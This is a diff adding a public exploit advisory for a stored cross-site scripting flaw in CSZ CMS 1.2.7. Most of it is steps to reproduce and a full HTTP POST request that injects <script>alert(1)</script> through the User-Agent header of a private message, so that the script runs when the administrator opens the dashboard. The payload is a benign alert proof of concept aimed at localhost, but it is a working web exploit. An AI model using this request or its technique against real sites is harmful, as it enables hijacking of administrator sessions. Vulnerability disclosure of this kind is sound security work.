@@ -1,0 +1,32 @@
+# Exploit Title: CSZ CMS 1.2.7 - Persistent Cross-Site Scripting
+# Exploit Author: Metin Yunus Kandemir
+# Vendor Homepage: https://www.cszcms.com/
+# Software Link: https://sourceforge.net/projects/cszcms/
+# Version: v1.2.7
+# Description:
+# Unauthorized user that has access private message can embed Javascript
+# code to admin panel.
+
+# Steps to reproduce:
+1- Log in to member panel.
+1- Change user-agent header as <script>alert(1)</script>
+2- Send the private message to admin user.
+3- When admin user logs in to Backend System Dashboard, an alert box pops
+up on screen.
+
+PoC Request:
+
+POST /CSZCMS-V1.2.7/member/insertpm/ HTTP/1.1
+Host: localhost
+User-Agent: <script>alert(1)</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/CSZCMS-V1.2.7/member/newpm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 152
+Cookie: cszcookie
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+csrf_csz=*&csrf_csz=*&to%5B%5D=1&title=user-agent&message=user-agent&submit=Send
